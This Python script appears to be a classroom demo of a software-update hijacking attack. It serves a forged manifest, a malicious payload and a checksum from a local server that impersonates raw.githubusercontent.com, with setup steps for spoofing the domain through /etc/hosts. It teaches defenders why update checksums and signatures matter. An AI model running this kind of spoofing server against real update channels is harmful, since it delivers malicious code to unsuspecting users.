#!/usr/bin/env python3
"""
Local attack server for demonstrating security vulnerabilities.

This server mimics GitHub's raw.githubusercontent.com URL structure to demonstrate
DNS hijacking and man-in-the-middle attacks. It only serves malicious content.

Usage:
    sudo python3 attack_server.py [--port PORT]
"""

import argparse
import hashlib
import http.server
import json
import os
import socketserver
from pathlib import Path


class AttackServerHandler(http.server.SimpleHTTPRequestHandler):
    """Custom handler that mimics GitHub raw URL structure and serves malicious content."""
    
    # Class variable to control checksum exposure
    expose_checksum = False
    
    def log_message(self, format, *args):
        """Override to add colored output."""
        print(f"🔴 [ATTACKER] {self.address_string()} - {format % args}")
    
    def do_GET(self):
        """Handle GET requests with GitHub-like URL structure."""
        
        # GitHub raw URL format: /preich21/cybersecurity-project-7/main/demo_files/manifest.json
        github_path = "/preich21/cybersecurity-project-7/refs/heads/fix/cli/demo_files/"
        
        # Check if this is a GitHub-style request
        if self.path.startswith(github_path):
            # Extract the filename
            filename = self.path[len(github_path):]
            
            # Serve manifest.json
            if filename == "manifest.json":
                self.serve_manifest()
                return
            
            # Serve update payload
            elif filename == "fake-update.txt":
                self.serve_update_payload()
                return
            
            # Serve checksum file
            elif filename == "fake-update.txt.sha256":
                self.serve_checksum_file()
                return
        
        # Fallback: serve files from current directory
        super().do_GET()
    
    def serve_manifest(self):
        """Serve MALICIOUS manifest."""
        print("\n" + "="*70)
        print("🚨 ATTACK: Serving MALICIOUS manifest")
        print("   (DNS hijacked - victim thinks this is GitHub!)")
        print("="*70)
        
        # Calculate actual hash of malicious update
        malicious_file = Path(__file__).parent / 'malicious-update.txt'
        if malicious_file.exists():
            with open(malicious_file, 'rb') as f:
                content = f.read()
                actual_hash = hashlib.sha256(content).hexdigest()
                actual_size = len(content)
        else:
            actual_hash = "0" * 64
            actual_size = 500
        
        # Use the SAME URL structure as legitimate updates
        # This is the key - victim's app doesn't change URLs!
        manifest = {
            "version": "99.99.99",
            "payload_url": "http://raw.githubusercontent.com/preich21/cybersecurity-project-7/refs/heads/fix/cli/demo_files/fake-update.txt",
            "sha256": actual_hash,
            "size": actual_size,
            "signature": "Fx7FcvIOccJdVjtVCKdGBqN2yRZqeirUBBoXrOm1cY0gL2XLP3bEeXW577d1tIOocs0nrrWT1jPCmv+pa3gmAw=="
        }
        
        print(f"   Version: {manifest['version']} (MALICIOUS!)")
        print(f"   Payload: {manifest['payload_url']}")
        print(f"   SHA256: {manifest['sha256'][:32]}...")
        print(f"   Signature: FORGED (will fail verification)")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(manifest, indent=2).encode())
        print("="*70 + "\n")
    
    def serve_update_payload(self):
        """Serve MALICIOUS update payload."""
        print("\n" + "="*70)
        print("🚨 ATTACK: Serving MALICIOUS update payload")
        print("="*70 + "\n")
        
        payload_file = Path(__file__).parent / 'malicious-update.txt'
        
        if not payload_file.exists():
            self.send_error(404, "Payload not found")
            return
        
        with open(payload_file, 'rb') as f:
            content = f.read()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-Length', str(len(content)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(content)
    
    def serve_checksum_file(self):
        """Serve MALICIOUS checksum file (matches malicious payload) - if enabled."""
        if not self.expose_checksum:
            print("\n" + "="*70)
            print("🛡️  DEFENSE: Checksum file NOT exposed (404)")
            print("   Attack will fail - no valid checksum available!")
            print("="*70 + "\n")
            self.send_error(404, "Checksum file not found")
            return
        
        print("\n" + "="*70)
        print("🚨 ATTACK: Serving MALICIOUS checksum file")
        print("   (Checksum matches malicious payload!)")
        print("="*70 + "\n")
        
        checksum_file = Path(__file__).parent / 'malicious-update.txt.sha256'
        
        if not checksum_file.exists():
            self.send_error(404, "Checksum file not found")
            return
        
        with open(checksum_file, 'r') as f:
            content = f.read()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-Length', str(len(content)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(content.encode())


def run_attack_server(port=80, expose_checksum=False):
    """Start the attack server on the specified port."""
    
    # Set the class variable for checksum exposure
    AttackServerHandler.expose_checksum = expose_checksum
    
    # Change to demo_files directory
    demo_dir = Path(__file__).parent
    os.chdir(demo_dir)
    
    print("\n" + "="*70)
    print("🔴 ATTACK SERVER STARTING")
    print("="*70)
    print(f"Port: {port}")
    print(f"Directory: {demo_dir}")
    print(f"Checksum Exposure: {'✅ ENABLED (attack will succeed)' if expose_checksum else '❌ DISABLED (attack will fail)'}")
    print("\nThis server mimics GitHub's raw.githubusercontent.com")
    print("to demonstrate DNS hijacking and MITM attacks.\n")
    print("="*70)
    print("\n📋 SETUP INSTRUCTIONS:")
    print("\n1. Add this line to /etc/hosts (requires sudo):")
    print(f"   127.0.0.1  raw.githubusercontent.com")
    print("\n2. The app will now connect to THIS server instead of GitHub")
    print("   (without changing any URLs in the code!)")
    print("\n3. Run the demo app:")
    print("   uv run python -m cra_demo_app.cli --no-https --no-signature --demo")
    print("\n4. Select option 4 to check for updates")
    print("\n5. Watch as the 'GitHub' server serves malicious content!")
    if not expose_checksum:
        print("\n💡 TIP: Attack will fail without checksum. Restart with --expose-checksum to succeed.")
    print("\n" + "="*70)
    print("\n⚠️  REMEMBER TO CLEANUP:")
    print("   sudo nano /etc/hosts")
    print("   (Remove the 127.0.0.1 raw.githubusercontent.com line)")
    print("\n" + "="*70)
    print("\n🚀 Server running... Press Ctrl+C to stop\n")
    
    with socketserver.TCPServer(("", port), AttackServerHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n" + "="*70)
            print("🔴 ATTACK SERVER STOPPED")
            print("="*70)
            print("\n✅ Don't forget to remove the /etc/hosts entry!")
            print("="*70 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Local attack server mimicking GitHub raw URLs",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Serve malicious updates on port 80 (checksum disabled - attack fails)
  sudo python3 attack_server.py
  
  # Enable checksum exposure to demonstrate successful attack
  sudo python3 attack_server.py --expose-checksum
  
  # Use port 8080 if you don't have sudo
  python3 attack_server.py --port 8080

Note: Port 80 requires sudo. The app uses HTTP for the demo,
      making it simple to demonstrate DNS hijacking attacks.
      
Demo Flow:
  1. Run without --expose-checksum: Attack fails (no valid checksum)
  2. Run with --expose-checksum: Attack succeeds (valid checksum provided)
        """
    )
    parser.add_argument(
        '--port',
        type=int,
        default=80,
        help='Port to run the server on (default: 80, requires sudo)'
    )
    parser.add_argument(
        '--expose-checksum',
        action='store_true',
        help='Expose the malicious checksum file (enables successful attack)'
    )
    
    args = parser.parse_args()
    
    # Warn if not using port 80
    if args.port != 80:
        print("\n⚠️  WARNING: Not using port 80")
        print("   For best results, use: sudo python3 attack_server.py\n")
    
    run_attack_server(args.port, args.expose_checksum)


if __name__ == '__main__':
    main()
